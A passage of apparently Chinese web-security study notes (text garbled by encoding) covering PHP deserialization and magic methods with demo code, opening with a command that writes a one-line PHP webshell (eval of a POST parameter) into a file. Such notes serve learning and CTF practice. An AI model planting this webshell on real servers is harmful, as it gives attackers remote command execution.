src="/2022/05/28/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></p><h4 id="2-å¸¸ç”¨å‘½ä»¤"><a href="#2-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="2.å¸¸ç”¨å‘½ä»¤"></a>2.å¸¸ç”¨å‘½ä»¤</h4><blockquote><p>ls</p><p>cat</p><p>touch</p><p>#åˆ›å»ºæ–‡ä»¶ï¼Œä¸€èˆ¬åˆ›å»ºè„šæœ¬æ–‡ä»¶ï¼Œ</p><p>æ¯”å¦‚<code>touch haha.php</code></p><p>ç„¶åå†æ‰§è¡Œ</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure><p>ï¼Œåœ¨è„šæœ¬æ–‡ä»¶é‡Œå†™ä¸€ä¸²ä¸€å¥è¯æœ¨é©¬</p><p><strong>ä½†æ˜¯æ³¨æ„å› ä¸ºæœ‰$ï¼Œåé¢çš„çœ‹å¯èƒ½ä¼šè¢«å½“åšå˜é‡ï¼Œæ‰€ä»¥å¯ä»¥åŠ ä¸Šåæ–œæ \è½¬ä¹‰</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure></blockquote><hr><h2 id="åã€brute-force"><a href="#åã€brute-force" class="headerlink" title="åã€brute force"></a>åã€brute force</h2><p>ä¸€æŠŠæœå“ˆå°±å®Œäº‹ï¼ˆå¥¸ç¬‘ï¼‰</p><hr><h2 id="åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰-1"><a href="#åä¸€ã€Deserialization-Vulnerabilitiesï¼ˆPHPï¼‰-1" class="headerlink" title="åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰"></a>åä¸€ã€Deserialization Vulnerabilitiesï¼ˆPHPï¼‰</h2><blockquote><p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">åŸæ–‡é“¾æ¥1</a></p><p><a href="https://zhuanlan.zhihu.com/p/377676274">åŸæ–‡é“¾æ¥2</a></p></blockquote><h3 id="åºåˆ—åŒ–ï¼š"><a href="#åºåˆ—åŒ–ï¼š" class="headerlink" title="åºåˆ—åŒ–ï¼š"></a>åºåˆ—åŒ–ï¼š</h3><blockquote><p><strong>åºåˆ—åŒ–</strong>(Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</p></blockquote><h3 id="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><blockquote><p>æ¦‚å¿µï¼š<code>phpçš„åºåˆ—åŒ–å°†å¯¹è±¡è½¬åŒ–ä¸ºäº†å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†å¯¹è±¡çš„æ‰€æœ‰æ•°æ®ä¿¡æ¯ï¼Œ</code><br><code>ååºåˆ—åŒ–æ—¶å†æ ¹æ®è¿™äº›ä¿¡æ¯è¿˜åŸå¯¹è±¡ã€‚</code></p><p><u>phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç”±serialize()å’Œunserialize()</u>è¿™ä¸¤ä¸ªå‡½æ•°æ¥å®Œæˆã€‚serialize()å®Œæˆåºåˆ—åŒ–çš„æ“ä½œï¼Œå°†ä¼ å…¥çš„å€¼è½¬æ¢ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼›è€Œunserialize()å®Œæˆååºåˆ—åŒ–çš„æ“ä½œï¼Œå°†å­—ç¬¦ä¸²è½¬æ¢æˆåŸæ¥çš„å˜é‡ã€‚</p><p><code>serialize(mixed $value): string</code><br>serialize()è¿”å›å­—ç¬¦ä¸²ï¼Œæ­¤å­—ç¬¦ä¸²åŒ…å«äº†è¡¨ç¤º value çš„å­—èŠ‚æµï¼Œå¯ä»¥å­˜å‚¨äºä»»ä½•åœ°æ–¹ï¼š</p><p>O::â€â€::{&lt;field name 1&gt;&lt;field value 1&gt;â€¦}</p></blockquote><p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>â€ƒâ€ƒ</p><blockquote><p>å½“åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° sleep()ã€‚è¿™æ ·å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œã€‚ç±»ä¼¼çš„ï¼Œå½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ã€‚<br><code>unserialize(string $str): mixed</code><br>â€ƒâ€ƒunserialize()å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› PHP çš„å€¼ã€‚<br>è‹¥è¢«ååºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸåœ°é‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHP ä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨ wakeup() æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ã€‚</p></blockquote><p>æ³¨æ„ï¼š</p><p><code>privateå£°æ˜</code></p><blockquote><p>private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚</p><p>å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</p><p>%00ä¹Ÿå°±æ˜¯ç©ºå­—ç¬¦ï¼Œæ— æ³•å¤åˆ¶ï¼Œåªèƒ½è‡ªå·±ä¿®æ”¹äºŒè¿›åˆ¶ï¼Œæˆ–è€…è‡ªå·±åŠ ä¸Š</p></blockquote><h3 id="phpé­”æœ¯æ–¹æ³•"><a href="#phpé­”æœ¯æ–¹æ³•" class="headerlink" title="phpé­”æœ¯æ–¹æ³•"></a>phpé­”æœ¯æ–¹æ³•</h3><blockquote><p><a href="https://blog.csdn.net/qq_45552960/article/details/102664372">åŸæ–‡é“¾æ¥</a></p></blockquote><p>â€ƒPHPä¸­ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„æ–¹æ³•ï¼Œ</p><blockquote><p><code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()ï¼Œ__autoload()</code></p></blockquote><p>è¢«ç§°ä¸ºâ€é­”æœ¯æ–¹æ³•â€ï¼ˆMagic methodsï¼‰ã€‚è¿™äº›æ–¹æ³•åœ¨ä¸€å®šæ¡ä»¶ä¸‹æœ‰ç‰¹æ®Šçš„åŠŸèƒ½ï¼Œåœ¨<code>å‘½åè‡ªå·±çš„ç±»æ–¹æ³•æ—¶ä¸èƒ½ä½¿ç”¨è¿™äº›æ–¹æ³•å</code>ï¼Œé™¤éæ˜¯æƒ³ä½¿ç”¨å…¶é­”æœ¯åŠŸèƒ½</p><p>ä¸åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é­”æœ¯æ–¹æ³•ä¸»è¦æ˜¯ï¼š</p><blockquote><p>__construct()&#x2F;&#x2F;å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</p><p>__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p><p>__wakeup() &#x2F;&#x2F;ä½¿ç”¨unserializeæ—¶è§¦å‘</p><p>__sleep() &#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘</p><p>__toString() &#x2F;&#x2F;æŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘<br>1.{å› ä¸ºechoæ— æ³•è¾“å‡ºå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¯¥é­”æ³•æ–¹æ³•ï¼Œåœ¨ç›´æ¥è¾“å‡ºå¯¹è±¡å¼•ç”¨çš„æ—¶å€™ï¼Œå°±ä¸ä¼šäº§ç”Ÿé”™è¯¯ï¼Œè€Œæ˜¯è‡ªåŠ¨è°ƒç”¨äº†â€__toString()â€æ–¹æ³•, è¾“å‡ºâ€œ__toString()â€æ–¹æ³•ä¸­è¿”å›çš„å­—ç¬¦ï¼Œæ‰€ä»¥â€œ__toString()â€æ–¹æ³•ä¸€å®šè¦æœ‰ä¸ªè¿”å›å€¼(return è¯­å¥)}<br>2.å½“ç„¶é™¤äº†å½“ä½œå­—ç¬¦ä¸²æ‰“å°æ—¶ä¼šè§¦å‘ï¼Œå½“æŠŠå®ä¾‹åŒ–çš„ç±»å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œpreg_matchåŒ¹é…æ—¶ï¼Œä¹Ÿä¼šè§¦å‘</p><p>__get() &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p><p>__set() &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p><p>__invoke()  &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p><p>__call()     &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p><p>__callStatic()  &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„å±æ€§</p><p>__isset()   &#x2F;&#x2F;å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</p><p>__set_state()   &#x2F;&#x2F;è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p><p>__clone()  &#x2F;&#x2F;å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</p><p>__autoload()   &#x2F;&#x2F;å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</p><p>__debugInfo()   &#x2F;&#x2F;æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</p></blockquote><p>Â·æ³¨æ„ï¼š</p><blockquote><p>PHP å°†æ‰€æœ‰ä»¥ <code>__</code>ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ <code>__</code> ä¸ºå‰ç¼€ã€‚</p><p><strong>Â·sleep() å’Œ wakeup()</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public __sleep ( void )<span class="keyword"> :</span><span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span>__wakeup ( void )<span class="keyword"> :</span> void</span><br></pre></td></tr></table></figure><p><code>serialize()</code> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ <code>NULL</code> è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯ã€‚</p><p><strong>Note</strong></p><blockquote><ol><li>__sleep() ä¸èƒ½è¿”å›çˆ¶ç±»çš„ç§æœ‰æˆå‘˜çš„åå­—ã€‚è¿™æ ·åšä¼šäº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯ä»¥ç”¨ Serializable æ¥å£æ¥æ›¿ä»£ã€‚</li><li>__sleep() æ–¹æ³•å¸¸ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚</li><li>ä¸ä¹‹ç›¸åï¼Œunserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</li><li>__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</li></ol></blockquote><p><strong>è®¿é—®æ§åˆ¶</strong></p><blockquote><ul><li>PHP å¯¹å±æ€§æˆ–æ–¹æ³•çš„è®¿é—®æ§åˆ¶ï¼Œæ˜¯é€šè¿‡åœ¨å‰é¢æ·»åŠ å…³é”®å­— publicï¼ˆå…¬æœ‰ï¼‰ï¼Œprotectedï¼ˆå—ä¿æŠ¤ï¼‰æˆ– privateï¼ˆç§æœ‰ï¼‰æ¥å®ç°çš„ã€‚</li><li>publicï¼ˆå…¬æœ‰ï¼‰ï¼šå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚</li><li>protectedï¼ˆå—ä¿æŠ¤ï¼‰ï¼šå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ã€‚</li><li>privateï¼ˆç§æœ‰ï¼‰ï¼šç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ã€‚</li></ul></blockquote><p><code>unserialize() å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå› PHP çš„å€¼ã€‚</code><br><code>åºåˆ—åŒ–è¯·ä½¿ç”¨ serialize() å‡½æ•°ã€‚</code></p><p><strong>è¯­æ³•</strong></p><blockquote><p><code>unserialize(str)</code></p><p>å‚æ•°    æè¿°<br><code>str</code>    å¿…éœ€ã€‚ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚<br>__wakeup()æ˜¯ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚unserialize()ä¼šæ£€æŸ¥å­˜åœ¨ä¸€ä¸ª__wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆä¼šè°ƒç”¨__wakeup()æ–¹æ³•ã€‚</p></blockquote></blockquote><hr><h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>è¢«ç§°ä¸ºæ„é€ æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨åˆ›é€ ä¸€ä¸ªå¯¹è±¡æ—¶å€™ï¼Œé¦–å…ˆä¼šå»æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯åœ¨<code>åºåˆ—åŒ–</code>å’Œ<code>ååºåˆ—åŒ–</code>è¿‡ç¨‹æ˜¯ä¸ä¼šè§¦å‘çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºå¯¹è±¡çš„æ—¶å€™è§¦å‘äº†ä¸€æ¬¡ï¼Œåœ¨åé¢çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½æ²¡æœ‰è§¦å‘ã€‚</p><hr><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>åœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†ä¸¤æ¬¡<code>__destruct()</code>ï¼Œå› ä¸ºä¸€ä¸ªå°±æ˜¯å®ä¾‹åŒ–çš„æ—¶å€™åˆ›å»ºçš„å¯¹è±¡ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ååºåˆ—åŒ–åç”Ÿæˆçš„å¯¹è±¡ã€‚</p><hr><h4 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h4><p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°**__call**éœ€è¦å®šä¹‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¡¨ç¤ºè°ƒç”¨çš„å‡½æ•°åï¼Œä¸€èˆ¬å¼€å‘ä¼šåœ¨è¿™é‡ŒæŠ¥é”™å†™xxxä¸å­˜åœ¨è¿™ä¸ªå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„æ•°ç»„ï¼Œè¿™é‡Œåªä¼ å…¥äº†ä¸€ä¸ªaã€‚</p><hr><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h4><p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆæ¥å­¦ä¹ ä¸€ä¸‹åŒå†’å·çš„ç”¨æ³•ï¼ŒåŒå†’å·ä¹Ÿå«åšèŒƒå›´è§£ææ“ä½œç¬¦ï¼ˆä¹Ÿå¯ç§°ä½œ Paamayim Nekudotayimï¼‰æˆ–è€…æ›´ç®€å•åœ°è¯´æ˜¯ä¸€å¯¹å†’å·ï¼Œå¯ä»¥ç”¨äºè®¿é—®é™æ€æˆå‘˜ï¼Œç±»å¸¸é‡ï¼Œè¿˜å¯ä»¥ç”¨äºè¦†ç›–ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚è‡ª PHP 5.3.0 èµ·ï¼Œå¯ä»¥é€šè¿‡å˜é‡æ¥å¼•ç”¨ç±»ï¼Œè¯¥å˜é‡çš„å€¼ä¸èƒ½æ˜¯å…³é”®å­—ï¼ˆå¦‚ <strong>self</strong>ï¼Œ<strong>parent</strong> å’Œ <strong>static</strong>ï¼‰ã€‚ä¸**__call<strong>ä¸åŒçš„æ˜¯éœ€è¦æ·»åŠ </strong>static**ï¼Œåªæœ‰è®¿é—®ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ‰ä¼šè§¦å‘ã€‚</p><hr><h4 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h4><p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 